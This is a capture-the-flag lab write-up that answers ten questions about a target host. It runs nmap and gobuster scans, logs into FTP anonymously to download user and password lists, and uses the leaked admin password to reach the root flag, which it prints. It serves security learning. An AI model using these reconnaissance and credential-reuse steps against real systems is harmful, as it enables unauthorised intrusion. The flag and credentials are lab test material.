<span style="color:cyan">**Question 1**</span> : What Nmap scanning switch employs the use of default scripts during a scan?

The Nmap scanning switch that employs the use of default scripts during a scan is `-sC`

    -sC

<span style="color:cyan">**Question 2**</span>: What service version is found to be running on port 21?

```
cmd :  nmap -sC -sV 10.129.142.51

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-15 16:33 CET
Nmap scan report for 10.129.142.51 (10.129.142.51)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
...
```
So, I can see that on port 21 is running FTP `vsftpd 3.0.3`.

    vsftpd 3.0.3

<span style="color:cyan">**Question 3**</span>: What FTP code is returned to us for the "Anonymous FTP login allowed" message?

From the previous output, I can see that the FTP code is `230`.

    230

<span style="color:cyan">**Question 4**</span>: After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

I tried connecting to the FTP server: 

```
cmd : ftp IP address

Connected to 10.129.142.51 (10.129.142.51).
220 (vsFTPd 3.0.3)
Name (10.129.142.51:giacomocomitani):
```

So, I tried logging in with `anonymous` as the name:

```
cmd : anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

So, to log in anonymously, I can use `anonymous` as the username.

    anonymous

<span style="color:cyan">**Question 5**</span>: After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

I tried running the `help` command to see all the available commands:

```
cmd : help

debug		mdir		sendport	site
dir		    mget		put		    size
account		disconnect	mkdir		pwd		    status
append		exit		mls		    quit	    struct
ascii		form		mode		quote	    system
bell		get		    modtime		recv	    sunique
binary		glob		mput		reget	    tenex
bye		    hash		newer		rstatus		tick
case		help		nmap		rhelp		trace
cd		    idle		nlist		rename		type
cdup		image		ntrans		reset		user
chmod		lcd		    open		restart		umask
close		ls		    prompt		rmdir		verbose
cr		    macdef		passive		runique		?
delete		mdelete		proxy		send
```

And I can see the `get` command is available!

    get

<span style="color:cyan">**Question 6**</span>:What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

Firstly, I use the `ls` command to verify that in my current directory there is the file I'm targeting:

```
cmd : ls 

227 Entering Passive Mode (10,129,142,51,162,117).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```
Then I run the `get` command to download the file:

```
cmd : get allowed.userlist

local: allowed.userlist remote: allowed.userlist
227 Entering Passive Mode (10,129,142,51,190,198).
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0,00016 secs (206,25 Kbytes/sec)
```
At the end, I run `cat` command to see the content of the file:
```
cmd : cat allowed.userlist

aron
pwnmeow
egotisticalsw
admin
```
`Admin` sounds like one of the higher-privilege sounding usernames in 'allowed.userlist'.

    Admin

<span style="color:cyan">**Question 7**</span>: What version of Apache HTTP Server is running on the target host?

I can see that in the previous output of nmap:

```
cmd : nmap -sC -sV IP address

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-15 16:33 CET
Nmap scan report for 10.129.142.51 (10.129.142.51)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix
```

     Apache httpd 2.4.41

<span style="color:cyan">**Question 8**</span>: What switch can we use with Gobuster to specify we are looking for specific filetypes?

To specify file extensions or types in Gobuster, I can use the `-x` switch

    -x

<span style="color:cyan">**Question 9**</span>: Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?

I tried running the command `gobuster dir -u http://[target_ip] -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x php` to perform a directory brute-force scan on the target web server using a specified wordlist.
```
cmd : gobuster dir -u http://10.129.142.51 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x php

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.142.51
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/11/15 18:51:08 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.129.142.51/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://10.129.142.51/css/]
/dashboard            (Status: 301) [Size: 318] [--> http://10.129.142.51/dashboard/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.142.51/fonts/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.142.51/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
```

`login.php` is interesting.

    login.php

<span style="color:cyan">**Question 10**</span>: Submit root flag

nce I am logged in on FTP, I can use the `get` command to download two files:

```
cmd: ftp 10.129.142.51
Connected to 10.129.142.51 (10.129.142.51).
220 (vsFTPd 3.0.3)
Name (10.129.142.51:): 

cmd : anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

cmd :  ls

227 Entering Passive Mode (10,129,142,51,157,176).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.

cmd: get allowed.userlist

local: allowed.userlist remote: allowed.userlist
227 Entering Passive Mode (10,129,142,51,159,136).
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0,000211 secs (156,40 Kbytes/sec)
cmd: get allowed.userlist.passwd

local: allowed.userlist.passwd remote: allowed.userlist.passwd
227 Entering Passive Mode (10,129,142,51,164,162).
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0,000115 secs (539,13 Kbytes/sec)
```

Here's the content of those files: 

```
allowed.userlist

aron
pwnmeow
egotisticalsw
admin

allowed.userlist.passwd

root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

So I now have `username` and `password` of admin

I tried Open again the browser typing `IP address/login.php` in the url bar, and I tried log in with :

username : admin

password: rKXM59ESxesUFHAd

It works! I have the flag !

    c7110277ac44d78b6a9fff2232434d16

